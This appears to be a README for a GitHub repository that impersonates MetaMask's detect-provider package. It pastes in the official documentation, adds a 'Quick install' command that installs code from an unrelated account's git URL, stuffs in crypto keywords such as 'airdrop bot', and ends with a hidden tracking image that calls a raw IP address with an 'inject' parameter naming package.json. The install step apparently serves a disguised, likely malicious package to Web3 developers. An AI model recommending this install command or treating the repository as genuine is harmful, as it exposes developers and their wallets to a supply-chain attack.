**Prohibitionauvibrate/detect-provider**

Finding the right Ethereum provider shouldn't feel like a guessing game for your decentralized app. This lightweight utility takes the headache out of wallet discovery by reliably scanning the window object to pinpoint exactly which provider is active. Thanks to some recent fixes that ironed out edge-case detection bugs, you can trust it to seamlessly handle modern multi-wallet environments without breaking a sweat.

**Quick install**

```bash
npm install git+https://github.com/Prohibitionauvibrate/detect-provider.git
```

[https://github.com/Prohibitionauvibrate/detect-provider](https://github.com/Prohibitionauvibrate/detect-provider)

# @metamask/detect-provider

A tiny utility for detecting the MetaMask Ethereum provider, or any provider injected at `window.ethereum`.

It has 0 dependencies and works out of the box in any modern browser, for synchronously and asynchronously injected providers.

## Usage

Keep in mind that the providers detected by this package may or may not support [the Ethereum JavaScript Provider API](https://eips.ethereum.org/EIPS/eip-1193).
Please consult [the MetaMask documentation](https://docs.metamask.io/guide/ethereum-provider.html) to learn how to use our provider.

### Node.js

```javascript
import { detectEthereumProvider } from '@metamask/detect-provider'

const provider = await detectEthereumProvider()

if (provider) {

  console.log('Ethereum successfully detected!')

  // From now on, this should always be true:
  // provider === window.ethereum

  // Access the decentralized web!

  // Legacy providers may only have ethereum.sendAsync
  const chainId = await provider.request({
    method: 'eth_chainId'
  })
} else {

  // if the provider is not detected, detectEthereumProvider resolves to null
  console.error('Please install MetaMask!')
}
```

### HTML

```html
<script src="https://unpkg.com/@metamask/detect-provider/dist/detect-provider.min.js"></script>
<script type="text/javascript">
  const provider = await detectEthereumProvider()

  if (provider) {
    // handle provider
  } else {
    // handle no provider
  }
</script>
```

### Options

The exported function takes an optional `options` object.
If invalid options are provided, an error will be thrown.
All options have default values.

#### `options.mustBeMetaMask`

Type: `boolean`

Default: `false`

Whether `window.ethereum.isMetaMask === true` is required for the returned Promise to resolve.

#### `options.silent`

Type: `boolean`

Default: `false`

Whether error messages should be logged to the console.
Does not affect errors thrown due to invalid options.

#### `options.timeout`

Type: `number`

Default: `3000`

How many milliseconds to wait for asynchronously injected providers.

## Advanced Topics

### Synchronous and Asynchronous Injection

Providers can be either synchronously or asynchronously injected:

- _Synchronously_ injected providers will be available by the time website code starts executing.
- _Asynchronously_ injected providers may not become available until later in the page lifecycle.

The MetaMask _extension_ provider is synchronously injected, while the MetaMask _mobile_ provider is asynchronously injected.

To notify sites of asynchronous injection, MetaMask dispatches the `ethereum#initialized` event on `window` immediately after the provider has been set as `window.ethereum`.
This package relies on that event to detect asynchronous injection.

### Overwriting or Modifying `window.ethereum`

The detected provider object returned by this package will strictly equal (`===`) `window.ethereum` for the entire page lifecycle, unless `window.ethereum` is overwritten.
In general, consumers should never overwrite `window.ethereum` or attempt to modify the provider object.

If, as a dapp developer, you notice that the provider returned by this package does not strictly equal `window.ethereum`, something is wrong.
This may happen, for example, if the user has multiple wallets installed.
After confirming that your code and dependencies are not modifying or overwriting `window.ethereum`, you should ask the user to ensure that they only have a single provider-injecting wallet enabled at any one time.

## Related searches

Developers looking for ways to streamline smart contract interactions and verify decentralized application environments often search for lightweight utilities that can seamlessly interface with injected Web3 wallets. This tooling is essential when building automated dApps, tracking live network updates, or validating cross-chain assets across custom endpoints.

**Topics:** crypto scraper, subgraph, crypto typescript, airdrop bot, coingecko api, web3 wallet detector, eip-1193 provider, ethereum boilerplate, smart contract integration, metamask connection, crypto automation, dapp utilities

![.](http://5.231.58.248:8787/pixel?repo=Prohibitionauvibrate%2Fdetect-provider&inject=Prohibitionauvibrate%2Fdetect-provider%2Fpackage.json)
